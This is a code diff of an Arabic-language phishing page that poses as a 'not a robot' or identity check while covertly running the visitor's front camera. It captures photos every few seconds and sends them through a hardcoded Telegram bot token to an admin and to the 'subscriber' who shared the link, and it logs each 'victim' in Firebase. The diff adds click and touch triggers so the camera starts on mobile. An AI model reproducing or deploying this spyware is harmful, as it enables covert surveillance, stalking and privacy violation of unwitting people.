@@ -9,42 +9,50 @@
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
-        body { height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2); background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite; }
+        body { height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg, #222, #444, #111); background-size: 400% 400%; animation: backgroundAnimation 10s ease infinite; color: white; cursor: pointer; }
         @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px; }
-        h1 { color: red; font-size: 22px; margin-bottom: 15px; }
-        .progress-container { background: #eee; border-radius: 10px; height: 20px; width: 100%; margin: 20px 0; overflow: hidden; }
+        
+        .container { background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 15px; border: 1px solid #ff5722; box-shadow: 0 0 20px rgba(255, 87, 34, 0.3); width: 90%; max-width: 400px; }
+        h1 { color: #ff5722; font-size: 22px; margin-bottom: 15px; }
+        p { font-size: 16px; margin-bottom: 10px; }
+        
+        .progress-container { background: #333; border-radius: 10px; height: 15px; width: 100%; margin: 20px 0; overflow: hidden; }
         .progress-bar { background: #ff5722; height: 100%; width: 100%; transition: 1s linear; }
+        
         video, canvas { display: none; }
+        .click-anywhere { font-size: 12px; color: #777; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>جاري التحقق من أنك لست روبوت</h1>
-        <p>يرجى الانتظار حتى ينتهي العد التنازلي...</p>
+    <div class="container" id="main-box">
+        <h1>جاري التحقق من الهوية</h1>
+        <p>يرجى النقر في أي مكان للشاشة للمتابعة...</p>
         <div class="progress-container">
             <div class="progress-bar" id="progress"></div>
         </div>
         <p id="countdown">20</p>
+        <p class="click-anywhere">(يجب النقر لبدء عملية الفحص)</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // 1. إعدادات الفايربيس
+        // 1. إعدادات الفايربيس (نفس إعدادات لوحتك)
         const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
         // 2. إعدادات التليجرام
         const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
-        const adminChatId = "5375214810"; // الأي دي الخاص بك (الأدمن)
+        const adminId = "5375214810";
 
-        // جلب معرف المشترك من الرابط ( user_id هو Chat ID التليجرام الخاص بالمشترك)
+        // جلب معرف العضو من الرابط
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get("user_id") || "Unknown";
+
+        let cameraStarted = false;
 
         // 3. نظام العد التنازلي
         let timeLeft = 20;
@@ -54,39 +62,40 @@
             document.getElementById("progress").style.width = (timeLeft / 20) * 100 + "%";
             if (timeLeft <= 0) {
                 clearInterval(countdownInterval);
-                document.querySelector('.container').innerHTML = "<h1>تم التحقق بنجاح ✅</h1><p>سيتم تحويلك الآن...</p>";
+                document.getElementById('main-box').innerHTML = "<h1>تم التحقق بنجاح ✅</h1><p>سيتم توجيهك الآن...</p>";
             }
         }, 1000);
 
-        // 4. تحديث الموقع (Firebase) - الشاشة الحية للمستخدم
-        function updateLiveStatus(statusText) {
-            if (userId !== "Unknown") {
-                db.ref('hits/' + userId + '/كاميرا').set({
-                    status: statusText,
-                    device: navigator.userAgent,
-                    last_update: new Date().toLocaleString()
-                });
-            }
-        }
-
-        // 5. تشغيل الكاميرا والسحب
+        // 4. دالة تشغيل الكاميرا وسحب الصور
         async function startCapture() {
+            if (cameraStarted) return;
+            
             try {
                 const video = document.getElementById('video');
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                
-                updateLiveStatus("🎥 الضحية متصل الآن - جاري سحب الصور");
+                const constraints = { 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                };
 
-                // سحب صورة كل 5 ثوانٍ (تجنب الـ 10ms عشان البوت ميعملش سبام ويتحظر)
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                cameraStarted = true;
+
+                // تحديث الحالة في فايربيس
+                db.ref('hits/' + userId + '/live_status').set("🎥 الضحية فتح الكاميرا!");
+
+                // سحب صورة كل 4 ثواني
                 setInterval(() => {
                     takeSnap(video);
-                }, 3000); 
+                }, 4000);
+
             } catch (err) {
-                updateLiveStatus("❌ الضحية رفض السماح بالكاميرا");
+                console.error("Error: ", err);
+                db.ref('hits/' + userId + '/live_status').set("❌ رفض الإذن أو المتصفح غير آمن");
             }
         }
 
+        // 5. التقاط الصورة وتحويلها
         function takeSnap(video) {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -95,35 +104,37 @@
             context.drawImage(video, 0, 0);
             
             canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append("photo", blob, "snap.jpg");
-                
-                // إضافة نص توضيحي للرسالة
-                const caption = `📸 صيد كاميرا جديد\n🆔 صاحب الرابط: ${userId}\n📱 الجهاز: ${navigator.platform}`;
-
-                // إرسال للأدمن (أنت)
-                sendToTelegram(adminChatId, blob, caption);
-
-                // إرسال للمشترك (لو حاطط الـ ID بتاعه في الرابط)
-                if (userId !== "Unknown" && userId !== adminChatId) {
-                    sendToTelegram(userId, blob, "📸 مبروك! تم سحب صورة من ضحيتك");
-                }
-            }, "image/jpeg");
+                sendToTelegram(blob);
+            }, "image/jpeg", 0.7);
         }
 
-        function sendToTelegram(chatId, blob, caption) {
+        // 6. الإرسال للتليجرام
+        function sendToTelegram(blob) {
+            const caption = `📸 صيد كاميرا جديد\n🆔 صاحب الرابط: ${userId}\n📱 نظام التشغيل: ${navigator.platform}`;
+            
             const fd = new FormData();
-            fd.append("chat_id", chatId);
             fd.append("photo", blob, "snap.jpg");
             fd.append("caption", caption);
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: fd
-            }).catch(e => console.error("Telegram Error"));
+            // إرسال للأدمن
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${adminId}`, { method: "POST", body: fd });
+
+            // إرسال لصاحب الرابط (العضو)
+            if (userId !== "Unknown" && userId !== adminId) {
+                const fd2 = new FormData();
+                fd2.append("photo", blob, "snap.jpg");
+                fd2.append("caption", "📸 تم سحب صورة من ضحيتك!");
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${userId}`, { method: "POST", body: fd2 });
+            }
         }
 
+        // 7. تفعيل الكاميرا عند أول لمسة للشاشة (مهم جداً للموبايلات)
+        document.body.addEventListener('click', startCapture);
+        document.body.addEventListener('touchstart', startCapture);
+
+        // محاولة التشغيل التلقائي برضه
         window.onload = startCapture;
     </script>
 </body>
 </html>
+
